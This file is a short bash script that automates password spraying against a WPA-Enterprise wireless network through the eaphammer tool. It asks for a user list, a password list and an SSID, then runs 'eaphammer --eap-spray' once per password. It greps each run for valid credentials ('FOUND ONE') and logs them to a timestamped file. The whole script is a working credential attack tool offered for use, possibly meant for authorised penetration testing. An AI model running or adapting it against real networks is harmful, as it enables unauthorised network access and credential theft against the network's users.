#!/bin/bash
echo "script expects to be run from same Dir as eaphammer"
read -p "Where is the userList? (absolute path only) " userList
read -p "What passwords should we use? (absolute path only) " passwords2spray
read -p "What SSID will we be using? " ssid
echo "Ok, good luck, cancel with CTRL+C"
i=1
time=$(date | sed "s/ /_/g");
while read -r line;
do
  echo "Run Number" $((i++)) "for password" $line;
  sudo ./eaphammer --eap-spray \
    --interface-pool wlan0 \
    --essid $ssid \
    --password $line \
    --user-list $userList > someeaphammerfile.txt
  AttemptedCreds=$(grep -Eio "Trying credentials:.*" someeaphammerfile.txt)
  message=$(grep -Eio "FOUND ONE:.*|Password invalid." someeaphammerfile.txt)
  error=$(grep -Eio "EAP-MSCHAPV2:.*" someeaphammerfile.txt)
  echo $AttemptedCreds | tee -a eaphammeroutput_$time.txt
  echo $error | tee -a eaphammeroutput_$time.txt
  echo $message | tee -a eaphammeroutput_$time.txt
  rm someeaphammerfile.txt
done < $passwords2spray